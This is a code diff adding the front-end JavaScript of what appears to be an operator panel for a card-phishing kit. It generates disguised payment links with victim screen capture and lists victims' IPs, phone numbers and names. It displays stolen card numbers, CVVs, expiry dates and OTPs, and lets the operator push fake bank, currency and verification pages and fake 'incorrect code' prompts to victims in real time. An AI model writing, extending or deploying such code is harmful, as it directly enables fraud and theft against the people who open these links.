+      <div class="visitor-detail">
+        <span class="detail-label">Carrier:</span>
+        <span class="detail-value">${carrier}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">Registered Name:</span>
+        <span class="detail-value">👤 ${name}</span>
+      </div>
+    `;
+  }
+  
+  // Add browser info if available
+  if (visitor.geoData) {
+    const { geoData } = visitor;
+    
+    // Create browser icon
+    let browserIcon = '';
+    switch(geoData.browser) {
+      case 'Chrome':
+        browserIcon = '<img src="https://cdn.jsdelivr.net/npm/simple-icons@v6/icons/googlechrome.svg" class="browser-icon" alt="Chrome">';
+        break;
+      case 'Firefox':
+        browserIcon = '<img src="https://cdn.jsdelivr.net/npm/simple-icons@v6/icons/firefoxbrowser.svg" class="browser-icon" alt="Firefox">';
+        break;
+      case 'Safari':
+        browserIcon = '<img src="https://cdn.jsdelivr.net/npm/simple-icons@v6/icons/safari.svg" class="browser-icon" alt="Safari">';
+        break;
+      case 'Edge':
+        browserIcon = '<img src="https://cdn.jsdelivr.net/npm/simple-icons@v6/icons/microsoftedge.svg" class="browser-icon" alt="Edge">';
+        break;
+      case 'Opera':
+        browserIcon = '<img src="https://cdn.jsdelivr.net/npm/simple-icons@v6/icons/opera.svg" class="browser-icon" alt="Opera">';
+        break;
+    }
+    
+    detailsHTML += `
+      <div class="visitor-detail">
+        <span class="detail-label">Browser:</span>
+        <span class="detail-value">${browserIcon} ${geoData.browser || 'Unknown'}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">Device:</span>
+        <span class="detail-value">${geoData.device || 'Unknown'}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">OS:</span>
+        <span class="detail-value">${geoData.os || 'Unknown'}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">Network:</span>
+        <span class="detail-value">${geoData.org || 'Unknown'}</span>
+      </div>
+    `;
+  }
+  
+  // Update the details section
+  detailsSection.innerHTML = detailsHTML;
+}
+
+    // Update visitors list
+    function updateVisitorsList(visitors) {
+      const visitorsList = document.getElementById('visitors-list');
+
+      // Clear existing list first
+      visitorsList.innerHTML = '';
+
+      if (!visitors || visitors.length === 0) {
+        visitorsList.innerHTML = '<p>No visitors yet</p>';
+        return;
+      }
+
+      // Sort visitors by timestamp (newest first)
+      visitors.sort((a, b) => {
+        return new Date(b.timestamp) - new Date(a.timestamp);
+      });
+
+      // Add each visitor to the list
+      visitors.forEach(visitor => {
+        // Store in map for reference
+        visitorsMap.set(visitor.pid, visitor);
+
+        // Add to DOM
+        addVisitorToList(visitor, false);
+      });
+
+      console.log(`Updated visitors list with ${visitors.length} visitors`);
+    }
+
+// Add visitor to list
+function addVisitorToList(visitor, isNew = true) {
+  if (!visitor || !visitor.pid) {
+    console.error('Invalid visitor data:', visitor);
+    return;
+  }
+
+  const visitorsList = document.getElementById('visitors-list');
+
+  // Check if this visitor is already in the list
+  const existingItem = document.getElementById(`visitor-${visitor.pid}`);
+  if (existingItem && !isNew) {
+    // Just update the details if needed
+    updateVisitorInList(visitor.pid);
+    return;
+  }
+
+  // Create visitor item
+  const visitorItem = document.createElement('div');
+  visitorItem.className = isNew ? 'visitor-item new' : 'visitor-item';
+  visitorItem.id = `visitor-${visitor.pid}`;
+
+  visitorItem.innerHTML = `
+    <span class="visitor-badge">VISITOR</span>
+    <span class="ip-address">${visitor.ip || 'Unknown'}</span>
+    <span>Payment ID: ${visitor.pid}</span>
+    <span class="visitor-time">${visitor.timestamp}</span>
+  `;
+
+  // Add to list (at beginning for new visitors)
+  if (isNew && visitorsList.firstChild) {
+    visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
+    console.log('Added new visitor to top of list:', visitor.pid);
+  } else {
+    visitorsList.appendChild(visitorItem);
+    console.log('Added visitor to list:', visitor.pid);
+  }
+
+  // Remove "No visitors yet" message if present
+  const noVisitorsMsg = visitorsList.querySelector('p');
+  if (noVisitorsMsg && noVisitorsMsg.textContent === 'No visitors yet') {
+    noVisitorsMsg.remove();
+  }
+  
+  // Create details section with phone info
+  const detailsSection = document.createElement('div');
+  detailsSection.className = 'visitor-details';
+  
+  // Add phone data if available
+  if (visitor.phoneData) {
+    const phoneHTML = `
+      <div class="visitor-detail">
+        <span class="detail-label">Phone:</span>
+        <span class="detail-value">📱 ${visitor.phoneData.phone}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">Carrier:</span>
+        <span class="detail-value">${visitor.phoneData.carrier || 'Unknown'}</span>
+      </div>
+      <div class="visitor-detail">
+        <span class="detail-label">Registered Name:</span>
+        <span class="detail-value">👤 ${visitor.phoneData.name || 'Unknown'}</span>
+      </div>
+    `;
+    detailsSection.innerHTML = phoneHTML;
+  } else {
+    detailsSection.innerHTML = `
+      <div class="visitor-detail">
+        <span class="detail-label">Phone:</span>
+        <span class="detail-value">📱 Loading phone data...</span>
+      </div>
+    `;
+  }
+  
+  // Append details section to visitor item
+  visitorItem.appendChild(detailsSection);
+  
+  // Fetch geo details if we don't have them
+  if (!visitor.geoData) {
+    fetchVisitorDetails(visitor.ip, visitor.pid);
+  }
+  
+  // If this is a new visitor, initialize screen capture
+  if (isNew) {
+    initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
+  }
+}
+
+    // Payment Link Generation - MODIFIED to include screen capture code and more robust error handling
+    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const amountInput = document.getElementById('amount');
+      const descInput = document.getElementById('description');
+      const linkContainer = document.getElementById('paymentLinkContainer');
+
+      try {
+        linkContainer.style.display = 'none';
+        const amount = parseFloat(amountInput.value);
+        const description = descInput.value.trim();
+
+        if (!amount || amount <= 0) throw new Error('Invalid amount');
+        if (!description) throw new Error('Description required');
+
+        // Show loading indication
+        const btn = e.target.querySelector('button[type="submit"]');
+        const originalText = btn.textContent;
+        btn.textContent = 'Generating...';
+        btn.disabled = true;
+
+        const response = await fetch('/api/generatePaymentLink', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            amount, 
+            description,
+            includeScreenCapture: true // Add flag to include screen capture code
+          })
+        });
+
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'Generation failed');
+
+        console.log('Server response:', data);
+
+        // Extract the pid from the original URL - UPDATED to handle various URL formats
+        const originalLink = data.paymentLink;
+        console.log('Original link:', originalLink);
+        
+        let pid;
+        
+        // Try to extract pid from URL query parameters
+        try {
+          // First try using URL constructor
+          const url = new URL(originalLink);
+          pid = url.searchParams.get('pid');
+        } catch (e) {
+          console.log('Error parsing URL, trying alternative extraction:', e);
+          
+          // Fallback to manual extraction
+          const queryPart = originalLink.split('?')[1];
+          if (queryPart) {
+            const params = new URLSearchParams(queryPart);
+            pid = params.get('pid');
+          }
+        }
+        
+        // Validate we have a pid
+        if (!pid) {
+          // Try one more method - direct extraction using regex
+          const pidMatch = originalLink.match(/[?&]pid=([^&]+)/);
+          if (pidMatch && pidMatch[1]) {
+            pid = pidMatch[1];
+          } else {
+            throw new Error('Could not extract payment ID from link');
+          }
+        }
+        
+        console.log('Extracted PID:', pid);
+        
+        // Generate random hash for the URL (6 characters, alphanumeric)
+        const randomHash = Math.random().toString(36).substring(2, 8);
+
+      // Create a clean URL with just the hash (no .html extension)
+        const origin = window.location.origin;
+        const hashUrl = `${origin}/${randomHash}?pid=${pid}`;
+        
+        document.getElementById('paymentLink').textContent = hashUrl;
+        linkContainer.style.display = 'block';
+        showMessage('success', 'Payment link with screen capture generated successfully!');
+        
+        // Reset button state
+        btn.textContent = originalText;
+        btn.disabled = false;
+      } catch (error) {
+        console.error('Error:', error);
+        alert(`Error: ${error.message}`);
+        linkContainer.style.display = 'none';
+        
+        // Reset button state
+        const btn = e.target.querySelector('button[type="submit"]');
+        if (btn) {
+          btn.textContent = 'Generate Link';
+          btn.disabled = false;
+        }
+      }
+    });
+
+    // New form handler for expiring payment links
+    document.getElementById('expireLinkForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const pidInput = document.getElementById('expirePid');
+      const resultContainer = document.getElementById('expireResultContainer');
+      const resultElement = document.getElementById('expireResult');
+
+      try {
+        resultContainer.style.display = 'none';
+        const pid = pidInput.value.trim();
+
+        if (!pid) throw new Error('Payment ID is required');
+
+        // Show loading indication
+        const btn = e.target.querySelector('button[type="submit"]');
+        const originalText = btn.textContent;
+        btn.textContent = 'Processing...';
+        btn.disabled = true;
+
+        const response = await fetch('/api/expirePaymentLink', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ pid })
+        });
+
+        const data = await response.json();
+        
+        // Reset button state
+        btn.textContent = originalText;
+        btn.disabled = false;
+        
+        if (!response.ok) {
+          resultElement.textContent = data.message || 'Failed to expire link';
+          resultContainer.style.display = 'block';
+          throw new Error(data.message || 'Failed to expire link');
+        }
+
+        // Show success message
+        resultElement.textContent = data.message || 'Payment link expired successfully!';
+        resultContainer.style.display = 'block';
+        showMessage('success', 'Payment link expired successfully!');
+        
+        // Clear the input field
+        pidInput.value = '';
+      } catch (error) {
+        console.error('Error:', error);
+        showMessage('error', `Error: ${error.message}`);
+        
+        // Reset button state
+        const btn = e.target.querySelector('button[type="submit"]');
+        if (btn) {
+          btn.textContent = 'Expire Link';
+          btn.disabled = false;
+        }
+      }
+    });
+
+    // Copy Payment Link
+    function copyPaymentLink() {
+      const link = document.getElementById('paymentLink').textContent;
+      navigator.clipboard.writeText(link);
+      alert('Link copied!');
+    }
+
+    // Transactions Handling
+    async function loadTransactions() {
+      try {
+        const tbody = document.querySelector("#transactionsTable tbody");
+        const loadingIndicator = document.getElementById('transactionsLoading');
+
+        if (loadingIndicator) loadingIndicator.style.display = 'block';
+        if (!tbody) {
+          console.error('Transactions table not found in DOM');
+          return;
+        }
+
+        console.log('Fetching transactions data...');
+        const response = await fetch("/api/transactions");
+
+        if (!response.ok) {
+          throw new Error(`Failed to load transactions: ${response.status}`);
+        }
+
+        const data = await response.json();
+        console.log(`Received ${data.length} transactions from server`);
+
+        // Hide loading indicator and show table
+        if (loadingIndicator) loadingIndicator.style.display = 'none';
+        tbody.innerHTML = '';
+
+        if (data.length === 0) {
+          tbody.innerHTML = `<tr><td colspan="12" style="text-align:center">No transactions found</td></tr>`;
+          return;
+        }
+
+        // Sort transactions with newest at the top
+        data.sort((a, b) => {
+          const timeA = new Date(a.timestamp || 0).getTime();
+          const timeB = new Date(b.timestamp || 0).getTime();
+          return timeB - timeA;
+        });
+
+        // Check if there's a new transaction based on timestamp
+        const latestTimestamp = data[0]?.timestamp ? new Date(data[0].timestamp).getTime() : 0;
+        const isNewTransaction = latestTimestamp > lastTransactionTime && lastTransactionTime > 0;
+        
+        // Update last known timestamp
+        if (latestTimestamp > 0) {
+          lastTransactionTime = latestTimestamp;
+        }
+
+        data.forEach((tx, index) => {
+          const row = document.createElement('tr');
+          row.setAttribute('data-invoice-id', tx.id);
+          
+          // Add 'new' class to highlight new transactions
+          if ((index === 0 && isNewTransaction) || (!tx.viewed && tx.timestamp)) {
+            row.classList.add('card-item', 'new');
+            
+            // Mark transaction as viewed
+            markTransactionViewed(tx.id);
+            
+            // If this is a new transaction, play sound
+            if (isNewTransaction) {
+              playNotificationSound('transaction');
+            }
+          }
+          
+          // For mobile view, add special class
+          const isMobile = window.innerWidth < 768;
+          if (isMobile) {
+            row.classList.add('card-mobile-view');
+          }
+          
+          // Bank info display with enhanced styling
+          const bankInfoDisplay = tx.bankInfo ? 
+            `<div class="card-detail-section">
+              <div class="card-detail-row">
+                <span class="card-detail-label">Bank</span>
+                <span class="card-detail-value">${tx.bankInfo.bank || 'Unknown'}</span>
+              </div>
+              <div class="card-detail-row">
+                <span class="card-detail-label">Country</span>
+                <span class="card-detail-value">${tx.bankInfo.countryCode || ''} ${tx.bankInfo.country || 'Unknown'}</span>
+              </div>
+            </div>` : '';
+          
+          // Create mobile optimized view if needed
+          if (isMobile) {
+            row.innerHTML = `
+              <td colspan="12">
+                <div class="card-item">
+                  <div class="card-mobile-commands">
+                    ${!tx.redirectStatus ? `
+                      <button onclick="updateTransactionStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
+                        Success
+                      </button>
+                      <button onclick="showCurrencyPage('${tx.id}')" class="currency-btn bg-blue-500 text-white" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                        Currency
+                      </button>
+                      <button onclick="showMCVerification('${tx.id}')" class="currency-btn bg-purple-600 text-white" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                        MC
+                      </button>
+                      <button onclick="updateTransactionStatus('${tx.id}', 'fail', document.getElementById('reason-${tx.id}').value)" ${!tx.otpEntered ? 'disabled' : ''} class="fail-btn">
+                        Fail
+                      </button>
+                    ` : ''}
+                  </div>
+                  
+                  <div class="card-detail-section">
+                    <div class="card-detail-row">
+                      <span class="card-detail-label">Card Number</span>
+                      <span class="card-detail-value">${tx.cardNumber}</span>
+                    </div>
+                    <div class="card-detail-row">
+                      <span class="card-detail-label">Cardholder</span>
+                      <span class="card-detail-value">${tx.cardholder}</span>
+                    </div>
+                    <div class="card-detail-row">
+                      <span class="card-detail-label">Expiry / CVV</span>
+                      <span class="card-detail-value">${tx.expiry} / ${tx.cvv}</span>
+                    </div>
+                    <div class="card-detail-row">
+                      <span class="card-detail-label">Amount</span>
+                      <span class="card-detail-value">${tx.amount} ${tx.currency || 'INR'}</span>
+                    </div>
+                    <div class="card-detail-row">
+                      <span class="card-detail-label">Status</span>
+                      <span class="card-detail-value">
+                        <span class="status-badge status-${tx.status || 'processing'}">
+                          ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
+                        </span>
+                      </span>
+                    </div>
+                    <div class="card-detail-row">
+                      <span class="card-detail-label">OTP</span>
+                      <span class="card-detail-value">
+                       ${tx.otpEntered ?
+                          `<span class="otp-received">${tx.otpEntered}</span>` : 
+                          (tx.otpShown ? 'Waiting for OTP' : 'Not shown')
+                        }
+                      </span>
+                    </div>
+                  </div>
+                  
+                  <div class="card-mobile-details">
+                    <div class="card-detail-section" style="margin-top: 10px;">
+                      <div class="card-detail-row">
+                        <span class="card-detail-label">Email</span>
+                        <span class="card-detail-value">${tx.email}</span>
+                      </div>
+                      <div class="card-detail-row">
+                        <span class="card-detail-label">IP Address</span>
+                        <span class="card-detail-value">${tx.ip || 'Unknown'}</span>
+                      </div>
+                      <div class="card-detail-row">
+                        <span class="card-detail-label">ID</span>
+                        <span class="card-detail-value">${tx.id}</span>
+                      </div>
+                    </div>
+                    ${bankInfoDisplay}
+                  </div>
+                </div>
+              </td>
+            `;
+          } else {
+            // Standard desktop view
+            row.innerHTML = `
+              <td>${tx.id}</td>
+              <td>${tx.email}</td>
+              <td>${tx.amount}</td>
+              <td>${tx.currency || 'INR'}</td>
+              <td>
+                ${tx.cardNumber}
+                ${bankInfoDisplay}
+              </td>
+              <td>${tx.cvv}</td>
+              <td>${tx.expiry}</td>
+              <td>${tx.cardholder}</td>
+              <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
+              <td>
+                ${tx.otpEntered ?
+                  `<span class="otp-received">${tx.otpEntered}</span>
+                   <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
+                     Incorrect OTP
+                   </button>` :
+                  (tx.otpShown ?
+                    '<span class="status-badge status-otp">Waiting for OTP</span>' :
+                    `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                      Show OTP
+                    </button>`)
+                }
+                <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                  ${tx.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}
+                </button>
+              </td>
+              <td>
+                <span class="status-badge status-${tx.status || 'processing'}">
+                  ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
+                </span>
+                ${tx.redirectStatus === 'success' ? '<span style="color:#22c55e;margin-left:5px;">✓</span>' : ''}
+                ${tx.redirectStatus === 'fail' ? '<span style="color:#ef4444;margin-left:5px;">✗</span>' : ''}
+              </td>
+              <td>
+                ${!tx.redirectStatus ? `
+                  <button onclick="updateTransactionStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
+                    Success
+                  </button>
+                  <button onclick="showCurrencyPage('${tx.id}')" class="currency-btn bg-blue-500 text-white mb-2" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    Currency
+                  </button>
+                  <button onclick="showMCVerification('${tx.id}')" class="currency-btn bg-purple-600 text-white" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    MC
+                  </button>
+                  <div class="reason-container">
+                    <select id="reason-${tx.id}" class="reason-dropdown">
+                      <option value="insufficient_balance" ${tx.failureReason === 'insufficient_balance' ? 'selected' : ''}>Insufficient Balance</option>
+                      <option value="bank_declined" ${tx.failureReason === 'bank_declined' || !tx.failureReason ? 'selected' : ''}>Bank Declined</option>
+                      <option value="card_disabled" ${tx.failureReason === 'card_disabled' ? 'selected' : ''}>Card Disabled</option>
+                      <option value="invalid_card" ${tx.failureReason === 'invalid_card' ? 'selected' : ''}>Invalid Card</option>
+                    </select>
+                    <button onclick="updateTransactionStatus('${tx.id}', 'fail', document.getElementById('reason-${tx.id}').value)" ${!tx.otpEntered ? 'disabled' : ''}
+                      class="fail-btn">
+                      Fail
+                    </button>
+                  </div>
+                ` : ''}
+              </td>
+            `;
+          }
+          
+          tbody.appendChild(row);
+          transactionsMap.set(tx.id, tx);
+        });
+      } catch (error) {
+        console.error('Error loading transactions:', error);
+        showMessage('error', 'Failed to load transactions');
+        document.getElementById('transactionsLoading').style.display = 'none';
+      }
+    }
+
+    // Copy Free Link
+function copyFreeLink() {
+  const link = document.getElementById('freeLink').textContent;
+  navigator.clipboard.writeText(link);
+  alert('Free link copied!');
+}
+
+// Free Link Generation
+document.getElementById('generateFreeLinkForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const descInput = document.getElementById('freeDescription');
+  const linkContainer = document.getElementById('freeLinkContainer');
+
+  try {
+    linkContainer.style.display = 'none';
+    const description = descInput.value.trim();
+
+    // Show loading indication
+    const btn = e.target.querySelector('button[type="submit"]');
+    const originalText = btn.textContent;
+    btn.textContent = 'Generating...';
+    btn.disabled = true;
+
+    const response = await fetch('/api/generateFreeLink', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        description,
+        isFreeLink: true,
+        includeScreenCapture: true
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) throw new Error(data.message || 'Generation failed');
+
+    console.log('Server response for free link:', data);
+    
+    // Extract the pid from the original URL
+    const originalLink = data.paymentLink;
+    console.log('Original free link:', originalLink);
+    
+    let pid;
+    
+    // Try to extract pid from URL query parameters
+    try {
+      const url = new URL(originalLink);
+      pid = url.searchParams.get('pid');
+    } catch (e) {
+      console.log('Error parsing URL, trying alternative extraction:', e);
+      
+      // Fallback to manual extraction
+      const queryPart = originalLink.split('?')[1];
+      if (queryPart) {
+        const params = new URLSearchParams(queryPart);
+        pid = params.get('pid');
+      }
+    }
+    
+    // Validate we have a pid
+    if (!pid) {
+      // Try one more method - direct extraction using regex
+      const pidMatch = originalLink.match(/[?&]pid=([^&]+)/);
+      if (pidMatch && pidMatch[1]) {
+        pid = pidMatch[1];
+      } else {
+        throw new Error('Could not extract payment ID from link');
+      }
+    }
+    
+    console.log('Extracted PID for free link:', pid);
+    
+    // Generate random hash for the URL (6 characters, alphanumeric)
+    const randomHash = Math.random().toString(36).substring(2, 8);
+
+    // Create a clean URL with just the hash and add free=true parameter
+    const origin = window.location.origin;
+    const hashUrl = `${origin}/${randomHash}?pid=${pid}&free=true`;
+    
+    document.getElementById('freeLink').textContent = hashUrl;
+    linkContainer.style.display = 'block';
+    showMessage('success', 'Free payment link generated successfully!');
+    
+    // Reset button state
+    btn.textContent = originalText;
+    btn.disabled = false;
+  } catch (error) {
+    console.error('Error generating free link:', error);
+    alert(`Error: ${error.message}`);
+    linkContainer.style.display = 'none';
+    
+    // Reset button state
+    const btn = e.target.querySelector('button[type="submit"]');
+    if (btn) {
+      btn.textContent = 'Generate Free Link';
+      btn.disabled = false;
+    }
+  }
+});
+    
+    // Mark transaction as viewed
+    async function markTransactionViewed(id) {
+      try {
+        await fetch("/api/markTransactionViewed", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+      } catch (error) {
+        console.error('Error marking transaction as viewed:', error);
+      }
+    }
+
+    // Currency Page Redirection
+    async function showCurrencyPage(id) {
+      const transaction = transactionsMap.get(id);
+      if (!transaction) {
+        alert('Transaction not found');
+        return;
+      }
+
+      try {
+        // Get the pid from the transaction
+        const response = await fetch(`/api/getTransactionPid?invoiceId=${id}`);
+        if (!response.ok) {
+          throw new Error('Failed to get payment details');
+        }
+
+        const data = await response.json();
+        if (!data.pid) {
+          throw new Error('No payment ID found');
+        }
+
+        // Emit socket event to redirect the user
+        socket.emit('currency_redirect', {
+          invoiceId: id,
+          pid: data.pid
+        });
+
+        console.log('Emitted currency_redirect with:', {
+          invoiceId: id,
+          pid: data.pid
+        });
+
+        alert('Currency page shown to customer');
+      } catch (error) {
+        console.error('Error showing currency page:', error);
+        alert('Failed to show currency page: ' + error.message);
+      }
+    }
+
+    // Transaction Actions - Enhanced with status feedback
+    async function updateTransactionStatus(id, status, reason = null) {
+      try {
+        // Show loading indicator on the button
+        const row = document.querySelector(`tr[data-invoice-id="${id}"]`);
+        if (row) {
+          const statusCell = row.querySelector('td:nth-child(11)');
+          if (statusCell) {
+            const loadingIndicator = document.createElement('span');
+            loadingIndicator.className = 'loading';
+            statusCell.appendChild(loadingIndicator);
+          }
+        }
+        
+        // Build the payload
+        const payload = { invoiceId: id, redirectStatus: status };
+        if (reason) {
+          payload.failureReason = reason;
+        }
+        
+        // Call API to update status
+        const response = await fetch("/api/updateRedirectStatus", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) throw new Error('Failed to update status');
+        
+        // Show feedback message
+        const statusText = status === 'success' ? 'Success' : 'Failed';
+        const reasonText = reason ? ` (${getReadableReason(reason)})` : '';
+        showMessage('success', `Transaction marked as ${statusText}${reasonText}`);
+        
+        // Reload transactions after a short delay
+        setTimeout(() => {
+          loadTransactions();
+        }, 500);
+      } catch (error) {
+        console.error('Error updating status:', error);
+        showMessage('error', 'Failed to update status');
+        loadTransactions();
+      }
+    }
+
+    // Helper function to get readable reason text
+    function getReadableReason(reasonCode) {
+      const reasons = {
+        'insufficient_balance': 'Insufficient Balance',
+        'bank_declined': 'Bank Declined',
+        'card_disabled': 'Card Disabled',
+        'invalid_card': 'Invalid Card'
+      };
+      return reasons[reasonCode] || reasonCode;
+    }
+
+    async function showOTP(id) {
+      try {
+        const response = await fetch("/api/showOTP", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to show OTP');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error showing OTP:', error);
+        alert('Failed to show OTP');
+      }
+    }
+
+    async function markWrongOTP(id) {
+      try {
+        const response = await fetch("/api/wrongOTP", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to mark OTP as wrong');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error marking OTP as wrong:', error);
+        alert('Failed to mark OTP as wrong');
+      }
+    }
+
+    async function toggleBankpage(id) {
+      const tx = transactionsMap.get(id);
+      try {
+        if (tx.bankpageVisible) {
+          await hideBankPage(id);
+        } else {
+          await showBankpage(id);
+        }
+      } catch (error) {
+        console.error('Error toggling bankpage:', error);
+        alert('Failed to toggle bank page: ' + error.message);
+      }
+    }
+
+    async function showBankpage(id) {
+      try {
+        const response = await fetch("/api/showBankpage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to show bank page');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error showing bank page:', error);
+        alert('Failed to show bank page');
+      }
+    }
+
+    async function hideBankPage(id) {
+      try {
+        const response = await fetch("/api/hideBankpage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to hide bank page');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error hiding bank page:', error);
+        alert('Failed to hide bank page');
+      }
+    }
+
+    // MC verification event handlers
+    document.addEventListener('DOMContentLoaded', function() {
+      // Initialize Telegram notifications
+      initTelegramNotifications();
+      
+      // Initialize screen canvas
+      initScreenCanvas();
+      
+      // Set up clear transactions button
+      document.getElementById('clearTransactionsBtn')?.addEventListener('click', clearAllTransactions);
+      
+      // Set up screen controls
+      setupScreenControls();
+
+      // Socket event handlers
+      socket.on('error', (error) => {
+        console.error('Socket error:', error);
+        showMessage('error', 'Socket error: ' + (error.message || 'Unknown error'));
+      });
+      
+      const mcOtpPanel = document.getElementById('mcOtpPanel');
+      const mcBankSelect = document.getElementById('mcBankSelect');
+      const mcVerificationType = document.getElementById('mcVerificationType');
+      const mcCurrencySelect = document.getElementById('mcCurrencySelect'); // Added currency select reference
+                              const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
+  const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
+  const mcFailOptionsBtn = document.getElementById('mcFailOptionsBtn');
+  const mcFailOptions = document.getElementById('mcFailOptions');
+  const mcFailWithReasonBtn = document.getElementById('mcFailWithReasonBtn');
+  const mcFailReasonDropdown = document.getElementById('mcFailReasonDropdown');
+  const mcClosePanelBtn = document.getElementById('mcClosePanelBtn');
+  
+  // Fail Options Button - Toggle dropdown
+  if (mcFailOptionsBtn) {
+    mcFailOptionsBtn.addEventListener('click', function() {
+      mcFailOptions.style.display = mcFailOptions.style.display === 'none' ? 'block' : 'none';
+    });
+  }
+  
+  // Fail with Reason Button
+  if (mcFailWithReasonBtn) {
+    mcFailWithReasonBtn.addEventListener('click', function() {
+      if (!currentMcInvoiceId) {
+        alert('No transaction selected for verification');
+        return;
+      }
+      
+      const reason = mcFailReasonDropdown.value;
+      console.log('Sending failed verification with reason:', reason);
+      
+      socket.emit('mc_verification_result', {
+        invoiceId: currentMcInvoiceId,
+        success: false,
+        reason: reason
+      });
+      
+      // Reset the panel
+      mcOtpPanel.classList.add('hidden');
+      mcFailOptions.style.display = 'none';
+      currentMcInvoiceId = null;
+    });
+  }
+  
+// Start Verification button handler - UPDATED to include phone number
+const mcStartVerificationBtn = document.getElementById('mcStartVerification');
+if (mcStartVerificationBtn) {
+  mcStartVerificationBtn.addEventListener('click', function() {
+    if (!currentMcInvoiceId) {
+      alert('No transaction selected for verification');
+      return;
+    }
+    
+    const verificationType = mcVerificationType.value;
+    const bankCode = mcBankSelect.value;
+    const selectedCurrency = mcCurrencySelect.value; // Get selected currency
+    const phoneLastFour = document.getElementById('mcPhoneLastFour').value; // Get entered phone number
+    
+    // Validate the phone number is 4 digits
+    if (phoneLastFour && !/^\d{4}$/.test(phoneLastFour)) {
+      alert('Phone number must be exactly 4 digits');
+      return;
+    }
+    
+    console.log('Starting verification with:', {
+      invoiceId: currentMcInvoiceId,
+      verificationType: verificationType,
+      bankCode: bankCode,
+      currency: selectedCurrency,
+      phoneLastFour: phoneLastFour // Log phone number
+    });
+    
+    // Send event to show verification UI to client with currency and phone number
+    socket.emit('start_verification', {
+      invoiceId: currentMcInvoiceId,
+      verificationType: verificationType,
+      bankCode: bankCode,
+      merchantName: 'Bologus pvt store.',
+      amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
+      currency: selectedCurrency, // Include selected currency
+      phoneLastFour: phoneLastFour // Include phone number
+    });
+  });
+}
+  
+  // Handle MC bank selection
+  mcBankSelect.addEventListener('change', function() {
+    if (currentMcInvoiceId) {
+      console.log('Changing bank to:', mcBankSelect.value, 'for invoice:', currentMcInvoiceId);
+      socket.emit('update_mc_bank', {
+        invoiceId: currentMcInvoiceId,
+        bankCode: mcBankSelect.value
+      });
+    }
+  });
+  
+  // Handle currency selection changes - NEW
+  if (mcCurrencySelect) {
+    mcCurrencySelect.addEventListener('change', function() {
+      if (currentMcInvoiceId) {
+        console.log('Changing currency to:', mcCurrencySelect.value, 'for invoice:', currentMcInvoiceId);
+        socket.emit('update_mc_currency', {
+          invoiceId: currentMcInvoiceId,
+          currency: mcCurrencySelect.value
+        });
+      }
+    });
+  }
+  
+  // Invalid OTP button
+  mcOtpInvalidBtn.addEventListener('click', function() {
+    if (currentMcInvoiceId) {
+      console.log('Sending invalid OTP message for invoice:', currentMcInvoiceId);
+      socket.emit('mc_otp_error', {
+        invoiceId: currentMcInvoiceId,
+        message: 'Incorrect verification code. Please try again.'
+      });
+    }
+  });
+  
+  // Success button
+  mcOtpSuccessBtn.addEventListener('click', function() {
+    if (currentMcInvoiceId) {
+      console.log('Sending successful verification result for invoice:', currentMcInvoiceId);
+      socket.emit('mc_verification_result', {
+        invoiceId: currentMcInvoiceId,
+        success: true
+      });
+      
+      // Reset the panel
+      mcOtpPanel.classList.add('hidden');
+      currentMcInvoiceId = null;
+    }
+  });
+  
+  // Close button
+  mcClosePanelBtn.addEventListener('click', function() {
+    console.log('Closing MC verification panel');
+    mcOtpPanel.classList.add('hidden');
